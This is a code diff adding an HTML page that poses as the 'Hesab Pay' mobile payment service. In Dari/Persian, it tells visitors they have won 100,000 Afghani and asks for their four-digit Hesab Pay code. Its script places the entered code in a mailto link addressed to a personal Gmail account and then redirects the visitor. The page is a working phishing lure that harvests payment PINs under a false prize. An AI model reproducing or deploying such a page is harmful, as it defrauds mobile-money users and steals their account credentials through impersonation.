@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hesab Pay</title>
+    <link rel="stylesheet" href="hesabPay.css">
+</head>
+<body>
+    
+    <p>تبریک تان باد<br>شما برنده ۱۰۰٬۰۰۰ افغانی شده اید</p>
+        <img src="../../image/giftMoney.png" width="200px" height="auto" alt="">
+        <p>برای ارسال پول به حساب تان<br>کد چهار رقمی حساب پی خود را وارد کنید</p>
+        <input type="number" id="code" placeholder="کد را وارد کنید">
+        <button onclick="getBunes()">دریافت جایزه</button>
+
+        <script>
+
+            function getBunes(){
+                window.location.href='mailto:alfannanmaher@gmail.com?subject=پیام جدید&body=' +
+                encodeURIComponent(document.getElementById('code').value);
+
+                let number= document.getElementById('code').value;
+
+                if (number.trim()===''){
+                    alert('لطفا کد را وارد کنید');
+                }else{
+                    window.location.href='page6.html';
+                }
+                }
+
+        </script>
+</body>
+</html>
